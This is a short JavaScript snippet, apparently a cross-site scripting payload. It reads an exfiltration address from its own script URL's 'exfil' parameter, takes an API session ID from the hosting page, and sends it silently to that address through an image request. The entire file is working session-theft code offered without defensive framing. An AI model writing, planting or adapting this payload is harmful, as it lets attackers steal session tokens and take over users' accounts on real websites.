(function () {
    var script = document.currentScript;
    var exfilUrl = '';
    if (script && script.src) {
        try {
            var u = new URL(script.src);
            exfilUrl = u.searchParams.get('exfil') || u.searchParams.get('exfilUrl') || '';
        } catch (e) {}
    }
    var el = document.getElementById('apiSessionId') || document.querySelector('[data-api-session-id]');
    var sessionId = el ? (el.value || (el.getAttribute && el.getAttribute('data-api-session-id')) || el.textContent || '').trim() : '';
    if (sessionId && exfilUrl) {
        try {
            new Image().src = exfilUrl + encodeURIComponent(sessionId);
        } catch (e) {}
    }
})();
